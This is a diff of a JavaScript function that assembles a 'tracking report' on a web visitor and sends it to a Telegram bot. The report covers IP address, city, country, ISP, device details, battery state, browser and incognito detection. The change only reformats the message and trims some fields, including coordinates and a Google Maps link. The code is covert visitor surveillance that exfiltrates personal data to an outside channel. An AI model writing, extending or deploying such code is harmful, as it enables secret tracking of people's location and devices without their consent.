@@ -636,55 +636,40 @@ async function sendEnhancedDataToTelegram() {
     try {
         const data = await collectEnhancedData();
         
-        // Use HTML formatting instead of Markdown
-        const telegramMessage = `
-<b>🚀 ENHANCED TRACKING REPORT</b>
-        
-<b>📅 Time:</b> ${new Date(data.timestamp).toLocaleString()}
-<b>🆔 Session:</b> <code>${data.sessionId}</code>
-        
-<b>📱 DEVICE</b>
-<b>Name:</b> ${data.deviceName}
-<b>Type:</b> ${data.device.isMobile ? '📱 Mobile' : data.device.isTablet ? '📟 Tablet' : '💻 Desktop'}
-<b>Platform:</b> ${data.device.platform}
-<b>Memory:</b> ${data.device.deviceMemory}GB
-<b>Cores:</b> ${data.device.hardwareConcurrency}
-        
-<b>📍 LOCATION</b>
-<b>IP:</b> <code>${data.ip.ip || 'Unknown'}</code>
-<b>City:</b> ${data.ip.city || 'Unknown'}
-<b>Country:</b> ${data.ip.country || 'Unknown'}
-<b>ISP:</b> ${data.ip.isp || 'Unknown'}
-<b>Coordinates:</b> <code>${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}</code>
-        
-<b>🗺️ GOOGLE MAPS</b>
-${data.googleMaps ? data.googleMaps.approximateAddress : 'Location not available'}
-<a href="${data.googleMaps ? data.googleMaps.googleMapsLink : '#'}">📍 Open in Google Maps</a>
-        
-<b>🌐 INTERNET</b>
-<b>Type:</b> ${data.internet.connection.effectiveType || 'unknown'}
-<b>Speed:</b> ${data.internet.connection.downlink || 'unknown'}
-<b>Latency:</b> ${data.internet.connection.rtt || 'unknown'}
-        
-<b>🔋 BATTERY</b>
-<b>Level:</b> ${data.battery.level || 'Unknown'}
-<b>Charging:</b> ${data.battery.charging ? '⚡ Yes' : '🔋 No'}
-<b>Battery Saving:</b> ${data.battery.batterySaving || 'Not detected'}
-        
-<b>🌐 BROWSER</b>
+        // Wrap everything in a code block for monospace formatting
+const telegramMessage = `
+<pre>
+🚀 ENHANCED TRACKING REPORT
+═══════════════════════════════════════
+
+📅 Time: ${new Date(data.timestamp).toLocaleString()}
+🆔 Session: ${data.sessionId}
+
+📱 DEVICE
+Name: ${data.deviceName}
+Type: ${data.device.isMobile ? 'Mobile' : 'Desktop'}
+Platform: ${data.device.platform}
+Memory: ${data.device.deviceMemory}GB
+Cores: ${data.device.hardwareConcurrency}
+
+📍 LOCATION
+IP: ${data.ip.ip}
+City: ${data.ip.city}
+Country: ${data.ip.country}
+ISP: ${data.ip.isp}
+
+🔋 BATTERY
+Level: ${data.battery.level}
+Charging: ${data.battery.charging ? 'Yes' : 'No'}
+
+🌐 BROWSER
 ${data.browser.name} ${data.browser.version}
-<b>Language:</b> ${data.browser.language}
-<b>Incognito:</b> ${data.incognito.isIncognito ? '✅ Yes' : '❌ No'} (${data.incognito.certainty} certainty)
-        
-<b>🖥️ SCREEN</b>
-<b>Resolution:</b> ${data.screen.resolution.width}x${data.screen.resolution.height}
-<b>Viewport:</b> ${data.display.viewport.width}x${data.display.viewport.height}
-<b>Pixel Ratio:</b> ${data.screen.devicePixelRatio}
-<b>Dark Mode:</b> ${data.display.darkMode ? '🌙 Enabled' : '☀️ Disabled'}
-        
-<b>📊 PERFORMANCE</b>
-<b>Load Time:</b> ${data.performance.timing ? Math.round(data.performance.timing.total) + 'ms' : 'N/A'}
-        `.replace(/[^\x00-\x7F]/g, ''); // Remove emojis if they cause issues
+Incognito: ${data.incognito.isIncognito ? 'Yes' : 'No'}
+
+═══════════════════════════════════════
+</pre>
+`.replace(/[^\x00-\x7F\n]/g, ''); // Keep only ASCII and newlines
+
         
         const result = await sendToTelegramBot(telegramMessage);
         
